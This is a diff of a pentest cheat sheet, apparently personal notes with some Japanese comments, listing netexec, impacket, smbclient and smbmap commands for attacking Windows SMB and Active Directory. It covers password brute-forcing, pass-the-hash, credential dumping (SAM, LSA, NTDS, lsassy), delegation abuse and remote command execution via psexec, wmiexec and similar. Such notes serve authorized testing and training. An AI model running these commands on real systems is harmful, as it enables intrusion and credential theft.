@@ -2,6 +2,7 @@
 - `rustsvan -a 0.0.0.0 --scripts none`
 - `nmap -n -Pn -p- -sV 0.0.0.0 `
 
+
 ## 135
 
 
@@ -43,7 +44,6 @@ impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME
 ```
 
 
-
 ## 445
 netexec(rpcを使用するためTCP135番も使う)
 ```sh
@@ -52,22 +52,19 @@ netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
 # NTHASH
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -H 'NTHASH'
 # Spidering Shares
-netexec smb 'IP' -u '' -p '' --share 'SHARENAME' -M spider_plus
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' -M spider_plus
 # Get and Put Files
-netexec smb 'IP' -u '' -p '' --share 'SHARENAME' --get-file '/REMOTEPATH/./.' '/LOCALPATH/./.'
-netexec smb 'IP' -u '' -p '' --share 'SHARENAME' --put-file '/LOCALPATH/./.' '/REMOTEPATH/./.'
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --get-file '/REMOTEPATH/./.' '/LOCALPATH/./.'
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --put-file '/LOCALPATH/./.' '/REMOTEPATH/./.'
 # Enumeration
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --disks
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --interfaces
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --local-group
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --loggedon-users
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --disks
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --shares
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --pass-pol
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --rid-brute
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --shares
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users
-# Checking for Spooler & WebDav
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M spooler
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M webdav
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --local-group
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export usres.txt
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --loggedon-users
 # Obtaining Credentials
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --sam
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --lsa
@@ -75,12 +72,25 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dpapi
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M ntdsutil
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M lsassy
 and so on ...
+# Checking for Spooler & WebDav
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M spooler
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M webdav
 # RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --delegate 'ADMINISTRAOR'
 # S4U2Self
 netexec smb 'IP' -u 'COMPUTERACCOUNT$' -H 'NTHASH' --delegate 'ADMINISTRAOR' --self
 # exec
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'smbexec' -x 'COMMAND'
+netexec smb 'IP' --share 'SHARENAME' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'smbexec' -x 'COMMAND'
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'wmiexec' -x 'COMMAND'
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x 'COMMAND'
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
+```
+
+impacket(rpcを使用するためTCP135番も使う)
+```sh
+impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
 
 smbclient
@@ -94,6 +104,12 @@ smbmap
 smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g smbmap.txt
 smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g smbmap.txt
 ```
+
+
+
+## link
+https://github.com/kavika13/RemCom
+
 
 
 ## credentials
